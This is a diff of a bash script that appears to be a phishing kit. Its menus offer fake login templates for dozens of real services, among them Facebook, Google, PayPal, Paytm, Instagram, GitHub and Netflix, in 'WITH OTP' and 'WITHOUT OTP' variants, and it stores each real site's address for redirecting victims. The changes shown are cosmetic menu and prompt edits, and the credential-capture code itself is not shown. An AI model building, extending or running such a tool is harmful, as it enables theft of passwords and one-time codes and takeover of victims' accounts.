@@ -31,7 +31,6 @@ log_name=$(date +%d-%m-%Y-%H-%M-%S)
 
 #Normal Banner
 banner(){
-	echo " "
         echo -e " "
         echo -e "${CYAN}----------------------------------------------------------------${NC} "
 	echo -e "${RED} ██      ██╗${BLUE}██████╗${NC}"
@@ -1094,7 +1093,7 @@ check_netstats
 echo "${BLUE}Your IP address = $myip"
 echo "${BLUE}Network Status  = $netstats"
 echo -e " "
-echo -e "${RED} CHOOSE A SITE : ${NC}"
+echo -e "${WHITE} CHOOSE A SITE : ${NC}"
 echo -e " "
 echo -e "${BLUE} [1] ${GREEN} Adobe         ${NC}""${BLUE} [26] ${GREEN} Mediafire     ${NC}""${BLUE} [51] ${GREEN} Telenor         ${NC}"
 echo -e "${BLUE} [2] ${GREEN} Airtel Sim    ${NC}""${BLUE} [27] ${GREEN} Messenger     ${NC}""${BLUE} [52] ${GREEN} Tiktok          ${NC}"
@@ -1289,15 +1288,14 @@ siname="Adobe"
 rdurl="www.adobe.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
 	1 | 01)
 		website="adobe"
 		tunnelmenu;;
@@ -1322,15 +1320,14 @@ siname="AirtelXStream"
 rdurl="www.airtelxstream.in"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="airtelxstream"
                 tunnelmenu;;
@@ -1348,15 +1345,14 @@ siname="AJIO"
 rdurl="www.ajio.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="ajio"
                 tunnelmenu;;
@@ -1374,15 +1370,14 @@ siname="Amazon"
 rdurl="www.amazon.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="amazon"
                 tunnelmenu;;
@@ -1400,15 +1395,14 @@ siname="Apple"
 rdurl="www.apple.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="apple"
                 tunnelmenu;;
@@ -1426,15 +1420,14 @@ siname="Badoo"
 rdurl="badoo.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="badoo"
                 tunnelmenu;;
@@ -1459,17 +1452,16 @@ siname="Date (Multiple phish)"
 rdurl="date.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} Template 1 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Template 1 - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Template 2 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Template 2 - WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="date1"
                 tunnelmenu;;
@@ -1493,15 +1485,14 @@ siname="Devian Art"
 rdurl="www.deviantart.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="devianart"
                 tunnelmenu;;
@@ -1526,15 +1517,14 @@ siname="Ebay"
 rdurl="www.ebay.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 -echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="ebay"
                 tunnelmenu;;
@@ -1552,9 +1542,8 @@ siname="Facebook"
 rdurl="www.facebook.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} Facebook - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Facebook - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Facebook Poll - WITHOUT OTP ${NC}"
@@ -1563,9 +1552,9 @@ echo -e "${BLUE}[05]${CYAN} Facebook Security - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[06]${CYAN} Facebook Security- WITH OTP ${NC}"
 echo -e "${BLUE}[07]${CYAN} Facebook Standard- WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="facebook"
                 tunnelmenu;;
@@ -1598,15 +1587,14 @@ siname="Flipcart"
 rdurl="www.flipcart.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="flipcart"
                 tunnelmenu;;
@@ -1631,17 +1619,16 @@ siname="GitHub"
 rdurl="www.github.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="github"
                 tunnelmenu;;
@@ -1665,17 +1652,16 @@ siname="GitLab"
 rdurl="www.gitlab.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
 	1 | 01)
                 website="gitlab"
                 tunnelmenu;;
@@ -1699,15 +1685,14 @@ siname="Gmail"
 rdurl="www.gmail.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="gmail"
                 tunnelmenu;;
@@ -1725,9 +1710,8 @@ siname="Google"
 rdurl="www.gmail.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} Google - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Google - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Google Poll - WITHOUT OTP ${NC}"
@@ -1735,9 +1719,9 @@ echo -e "${BLUE}[04]${CYAN} Google Poll - WITH OTP ${NC}"
 echo -e "${BLUE}[05]${CYAN} Google old - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[06]${CYAN} Google old - WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="google"
                 tunnelmenu;;
@@ -1767,15 +1751,14 @@ siname="Gpay"
 rdurl="pay.google.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="gpay"
                 tunnelmenu;;
@@ -1800,9 +1783,8 @@ siname="Instagram"
 rdurl="www.instagram.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} Instagram - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Instagram - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Instagram Advanced - WITHOUT OTP ${NC}"
@@ -1816,9 +1798,9 @@ echo -e "${BLUE}[10]${CYAN} Instagram Old - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[11]${CYAN} Instagram Old - WITH OTP ${NC}"
 echo -e "${BLUE}[12]${CYAN} Instagram Video - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="instagram"
                 tunnelmenu;;
@@ -1873,15 +1855,14 @@ siname="JIO"
 rdurl="www.jio.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} Jio sim ${NC}"
 echo -e "${BLUE}[02]${CYAN} Jio offer ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="jiosim"
                 tunnelmenu;;
@@ -1899,15 +1880,14 @@ siname="Linkedin"
 rdurl="linkedin.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="linkedin"
                 tunnelmenu;;
@@ -1925,15 +1905,14 @@ siname="Medifire"
 rdurl="www.mediafire.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="mediafire"
                 tunnelmenu;;
@@ -1951,17 +1930,16 @@ siname="Messenger"
 rdurl="www.messenger.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} Messenger - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Messenger - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Messenger old - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Messenger old - WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="messenger"
                 tunnelmenu;;
@@ -1985,15 +1963,14 @@ siname="Microsoft"
 rdurl="www.microsoft.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="microsoft"
                 tunnelmenu;;
@@ -2018,15 +1995,14 @@ siname="MySpace"
 rdurl="myspace.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="myspace"
                 tunnelmenu;;
@@ -2044,15 +2020,14 @@ siname="Netflix"
 rdurl="www.netflix.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="netflix"
                 tunnelmenu;;
@@ -2084,15 +2059,14 @@ siname="Paypal"
 rdurl="www.paypal.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="paypal"
                 tunnelmenu;;
@@ -2110,17 +2084,16 @@ siname="Paytm"
 rdurl="paytm.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} Paytm - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Paytm - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Paytm offer - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Paytm Offer - WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="paytm"
                 tunnelmenu;;
@@ -2158,16 +2131,15 @@ siname="PlayStation"
 rdurl="www.playstation.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} Playstation 1 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Playstation 1 - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Playstation 2 - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="playstation"
                 tunnelmenu;;
@@ -2189,9 +2161,9 @@ rdurl="proton.me/"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="protonmail"
                 tunnelmenu;;
@@ -2223,15 +2195,14 @@ siname="Reddit"
 rdurl="www.reddit.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} Reddit ${NC}"
 echo -e "${BLUE}[02]${CYAN} Reddit old ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="reddit"
                 tunnelmenu;;
@@ -2249,15 +2220,14 @@ siname="Shopify"
 rdurl="www.shopify.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="shopify"
                 tunnelmenu;;
@@ -2275,15 +2245,14 @@ siname="Snapchat"
 rdurl="www.snapchat.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="snapchat"
                 tunnelmenu;;
@@ -2301,15 +2270,14 @@ siname="SocialClub"
 rdurl="socialclub.rockstargames.com"
 { clear; banner; echo -e ""; }
 echo -e "${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
-echo -e ""; echo -e ""
-echo "${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
-echo -e "\n"
+echo -e "${RED}[${WHITE}-${RED}]${WHITE} Choose a choice"
+echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-read -p "${MAGENTA} YOUR CHOICE : " choice
+read -p "${RED}[${WHITE}?${RED}]${YELLOW} YOUR CHOICE : ${BLUE}" sichoice
 
-case $choice in
+case $sichoice in
         1 | 01)
                 website="socialclub"
                 tunnelmenu;;
@@ -2327,15 +2295,14 @@ siname="Spotify"
 rdurl="www.spotify.com"
 { clear; banner; echo -e ""; }
